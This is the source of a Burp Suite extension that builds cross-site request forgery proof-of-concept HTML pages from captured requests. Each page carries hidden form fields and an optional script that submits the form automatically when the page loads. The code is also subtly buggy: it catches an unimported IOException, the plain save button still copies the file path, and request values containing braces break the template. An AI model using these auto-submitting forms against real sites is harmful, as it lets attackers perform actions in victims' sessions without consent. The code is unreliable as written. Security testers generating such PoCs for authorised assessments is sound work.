from burp import IBurpExtender
from burp import IContextMenuFactory
from javax.swing import JMenuItem, JFrame, JTextArea, JButton, JScrollPane, JPanel, JFileChooser, BorderFactory, JCheckBox
from java.awt import BorderLayout, Toolkit, Dimension, GridBagLayout, GridBagConstraints, Insets
from java.awt.datatransfer import StringSelection
from java.util import ArrayList
from java.io import File
import cgi

class BurpExtender(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("CSRF Wizard")
        callbacks.registerContextMenuFactory(self)

    def createMenuItems(self, invocation):
        self._invocation = invocation
        menu_list = ArrayList()
        menu_item = JMenuItem("Generate CSRF PoC", actionPerformed=self.generate_csrf)
        menu_list.add(menu_item)
        return menu_list

    def generate_csrf(self, event):
        selected_messages = self._invocation.getSelectedMessages()
        for message in selected_messages:
            request_info = self._helpers.analyzeRequest(message)
            service = message.getHttpService()
            url = str(service.getProtocol()) + "://" + str(service.getHost()) + ":" + str(service.getPort()) + str(request_info.getUrl().getPath())
            method = request_info.getMethod()
            self.csrf_html_template = "<html>\n<head>\n{script}\n</head>\n<body>\n<form id='csrfForm' action='" + cgi.escape(url) + "' method='" + method.lower() + "'>\n"
            
            if method == "POST":
                for parameter in request_info.getParameters():
                    self.csrf_html_template += "    <input type='hidden' name='" + cgi.escape(parameter.getName()) + "' value='" + cgi.escape(parameter.getValue()) + "'/>\n"
            
            self.csrf_html_template += "    <input type='submit' value='Submit Request'/>\n</form>\n</body>\n</html>"
            self.show_csrf_popup()

    def show_csrf_popup(self):
        self.frame = JFrame("CSRF Wizard - PoC Editor")
        self.frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE)
        self.text_area = JTextArea(20, 50)
        self.text_area.setText(self.csrf_html_template.format(script=""))
        self.text_area.setCaretPosition(0)
        self.text_area.setEditable(True)
        scroll_pane = JScrollPane(self.text_area)
        scroll_pane.setPreferredSize(Dimension(500, 350))
        scroll_pane.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        self.auto_submit_checkbox = JCheckBox("Auto Submit", False, itemStateChanged=self.toggle_auto_submit)
        
        save_button = JButton('Save to File', actionPerformed=self.save_to_file)
        save_and_copy_button = JButton('Save and Copy Location', actionPerformed=lambda e: self.save_to_file(copy_path=True))

        button_panel = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        button_panel.add(self.auto_submit_checkbox, gbc)
        button_panel.add(save_button, gbc)
        button_panel.add(save_and_copy_button, gbc)

        self.frame.setLayout(BorderLayout())
        self.frame.add(scroll_pane, BorderLayout.CENTER)
        self.frame.add(button_panel, BorderLayout.SOUTH)
        self.frame.pack()
        self.frame.setLocationRelativeTo(None)
        self.frame.setVisible(True)

    def toggle_auto_submit(self, event):
        script = "<script type='text/javascript'>document.addEventListener('DOMContentLoaded', function(event) { document.getElementById('csrfForm').submit(); });</script>\n" if self.auto_submit_checkbox.isSelected() else ""
        self.text_area.setText(self.csrf_html_template.format(script=script))

    def save_to_file(self, copy_path=False):
        chooser = JFileChooser()
        chooser.setDialogTitle("Save CSRF PoC")
        returnVal = chooser.showSaveDialog(self.frame)
        if returnVal == JFileChooser.APPROVE_OPTION:
            file = chooser.getSelectedFile()
            filepath = file.getAbsolutePath()
            if not filepath.lower().endswith(".html"):
                filepath += ".html"
            try:
                with open(filepath, 'w') as f:
                    f.write(self.text_area.getText())
                if copy_path:
                    self.copy_to_clipboard(filepath)
                self.frame.dispose()
            except IOException as e:
                print("Error saving file: " + e.getMessage())

    def copy_to_clipboard(self, text):
        toolkit = Toolkit.getDefaultToolkit()
        clipboard = toolkit.getSystemClipboard()
        clipboard.setContents(StringSelection(text), None)
